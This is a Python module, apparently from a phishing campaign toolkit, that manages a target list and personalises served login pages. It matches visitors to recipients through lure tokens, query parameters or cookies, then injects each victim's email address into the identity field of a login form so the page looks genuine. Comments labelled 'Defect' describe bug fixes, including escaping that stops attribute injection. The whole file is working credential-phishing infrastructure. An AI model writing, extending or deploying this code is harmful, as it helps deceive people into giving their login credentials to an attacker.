"""Targets: who is being written to, and the values that make a page look personal.

The difference between a mass mail and a targeted one is what the recipient sees about
themselves: their own name, their own address already in the form, a document named the way
their department names documents. This module holds that per-target context, matches it to
an incoming visit (a lure token, an address, or a query parameter) and mutates the served
page so the form arrives pre-filled.

Nothing here invents data: a target is a row from the operator's own list, and a field the
list does not carry is left empty rather than guessed.
"""
import csv
import json
import os
import re

__all__ = ["Target", "Targets", "prefill_html", "load", "identity_fields"]

# The input names a login form uses for the identity, most specific first. A prefill has to
# find the real one: filling `user` when the form posts `loginfmt` shows an empty box.
IDENTITY_NAMES = ("email", "username", "user", "login", "loginfmt", "identifier", "account",
                  "userid", "user_id", "email_address", "username_or_email", "session_key")

_PW_HINT = re.compile(r"pass|pwd|passwd|secret|otp|code", re.I)


class Target:
    """One recipient: an address plus whatever context the operator's list carries."""

    __slots__ = ("email", "name", "first_name", "role", "locale", "timezone", "dept",
                 "company", "manager", "token", "extra")

    def __init__(self, email="", name="", role="", locale="en", timezone="", dept="",
                 company="", manager="", token="", **extra):
        self.email = str(email or "").strip()
        self.name = str(name or "").strip()
        self.first_name = (self.name.split()[0] if self.name else
                           self.email.split("@")[0].split(".")[0].title())
        self.role = str(role or "").strip().lower()
        self.locale = str(locale or "en").strip()
        self.timezone = str(timezone or "").strip()
        self.dept = str(dept or "").strip()
        self.company = str(company or "").strip()
        self.manager = str(manager or "").strip()
        self.token = str(token or "").strip()
        self.extra = {k: v for k, v in (extra or {}).items() if v not in (None, "")}

    def context(self, **over):
        """The template context for this target (extra keys pass through)."""
        ctx = {"To_Address": self.email, "To_Name": self.name,
               "To_FirstName": self.first_name, "Role": self.role,
               "Locale": self.locale, "Timezone": self.timezone,
               "Dept": self.dept, "Company": self.company, "Manager": self.manager}
        ctx.update({k: v for k, v in self.extra.items() if k not in ctx})
        ctx.update(over)
        return ctx

    def to_dict(self):
        d = {"email": self.email, "name": self.name, "role": self.role,
             "locale": self.locale, "timezone": self.timezone, "dept": self.dept,
             "company": self.company, "manager": self.manager, "token": self.token}
        d.update(self.extra)
        return d


class Targets:
    """A target list with the lookups a campaign needs."""

    def __init__(self, rows=None):
        # Defect: Target(**r) raised TypeError ("argument after ** must be a
        # mapping") when a row was not a mapping - a hand-edited JSON list, a
        # CSV with a stray line - which took the whole target list down at load.
        out = []
        for r in (rows or []):
            if isinstance(r, Target):
                out.append(r)
            elif isinstance(r, dict):
                out.append(Target(**r))
        self.rows = out

    def __len__(self):
        return len(self.rows)

    def __iter__(self):
        return iter(self.rows)

    def by_email(self, email):
        e = str(email or "").strip().lower()
        return next((t for t in self.rows if t.email.lower() == e), None)

    def by_token(self, token):
        t = str(token or "").strip()
        if not t:
            return None
        return next((r for r in self.rows if r.token and r.token == t), None)

    def for_request(self, path="", query="", cookie_email=""):
        """Match a visit to a target: `?t=`, `?email=`, a lure token, or a cookie.

        A match is best-effort on purpose - no match means the page is served without
        personalisation, never with someone else's data.
        """
        if cookie_email:
            hit = self.by_email(cookie_email)
            if hit:
                return hit
        for source in (query, path):
            for key in ("t", "token", "e", "email", "u"):
                m = re.search(rf"(?:^|[?&]){key}=([^&]+)", str(source or ""))
                if m:
                    from urllib.parse import unquote
                    value = unquote(m.group(1))
                    hit = self.by_token(value) or self.by_email(value)
                    if hit:
                        return hit
        # a lure-style path: the last segment is the token (/l/<token>, /<token>)
        from urllib.parse import unquote
        segments = [seg for seg in str(path or "").split("?")[0].split("/") if seg]
        for segment in reversed(segments):
            hit = self.by_token(segment) or self.by_email(unquote(segment))
            if hit:
                return hit
        return None

    def emails(self):
        return [t.email for t in self.rows if t.email]

    def roles(self):
        return sorted({t.role for t in self.rows if t.role})

    def summary(self):
        return {"targets": len(self.rows), "with_token": sum(1 for t in self.rows if t.token),
                "roles": self.roles(),
                "locales": sorted({t.locale for t in self.rows if t.locale})}


def identity_fields(html):
    """The identity input names present in a form, in the order they appear."""
    # Defect: a bytes/None body reached re.finditer with a str pattern and
    # raised TypeError; only real HTML text can carry a form.
    text = html if isinstance(html, str) else ""
    found = []
    for m in re.finditer(r"<input\b[^>]*>", text, re.I):
        tag = m.group(0)
        name = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
        if not name:
            continue
        value = name.group(1)
        if _PW_HINT.search(value):
            continue
        if value.lower() in IDENTITY_NAMES:
            found.append(value)
    return found


def _attr(value):
    """Escape a value for a double-quoted HTML attribute.

    Defect: the target address was written into `value="..."` unescaped, so an
    address containing a double quote closed the attribute and injected the rest
    as markup into the served login form (HTML/attribute injection). Escaping is
    a no-op for an ordinary address.
    """
    return (str(value).replace("&", "&amp;").replace('"', "&quot;")
            .replace("<", "&lt;").replace(">", "&gt;"))


def prefill_html(html, target, field=None):
    """Put the target's own address in the served form.

    Only an identity input is touched (never a password field), and only when it has no
    value of its own - the site's own placeholder or a value the page set is left alone. An
    existing `value="..."` from the upstream is replaced only when `field` names it
    explicitly, so a prefill cannot overwrite something the real page needed.
    """
    if not html or target is None or not getattr(target, "email", ""):
        return html
    # Defect: a non-string field name reached re.escape() and raised TypeError.
    names = [str(field)] if field else identity_fields(html)
    if not names:
        return html
    out = html
    for name in names:
        pattern = re.compile(
            r'(<input\b[^>]*\bname\s*=\s*["\']' + re.escape(str(name)) + r'["\'][^>]*?)(/?>)',
            re.I)

        def _fix(m, value=target.email):
            tag, close = m.group(1), m.group(2)
            if re.search(r"\bvalue\s*=\s*[\"'][^\"']+[\"']", tag, re.I):
                return m.group(0)              # already filled by the page: leave it
            return f'{tag} value="{_attr(value)}"{close}'

        out = pattern.sub(_fix, out)
    return out


def load(path):
    """Load a target list from .csv, .tsv or .json.

    A CSV needs a header row; `email` (or `mail`/`address`) is the only required column, and
    everything else lands in `extra` so a custom column reaches the template as-is.
    """
    if not path or not os.path.isfile(path):
        raise FileNotFoundError(f"target list not found: {path}")
    if path.lower().endswith(".json"):
        with open(path, encoding="utf-8") as fh:
            data = json.load(fh)
        # Defect: a JSON object where a list was expected (or a "targets" key
        # holding an object) was iterated as its keys, feeding strings to
        # Targets(); only a real list is a target list.
        rows = data.get("targets") if isinstance(data, dict) else data
        if not isinstance(rows, list):
            rows = []
        return Targets(rows)
    delim = "\t" if path.lower().endswith(".tsv") else ","
    with open(path, encoding="utf-8-sig", newline="") as fh:
        reader = csv.DictReader(fh, delimiter=delim)
        rows = []
        for raw in reader:
            row = {(k or "").strip().lower(): (v or "").strip() for k, v in raw.items()}
            email = row.pop("email", "") or row.pop("mail", "") or row.pop("address", "")
            if not email:
                continue
            name = row.pop("name", "") or row.pop("full_name", "")
            rows.append(Target(email=email, name=name,
                               role=row.pop("role", ""), locale=row.pop("locale", "") or "en",
                               timezone=row.pop("timezone", ""), dept=row.pop("dept", ""),
                               company=row.pop("company", ""), manager=row.pop("manager", ""),
                               token=row.pop("token", ""), **row))
    return Targets(rows)
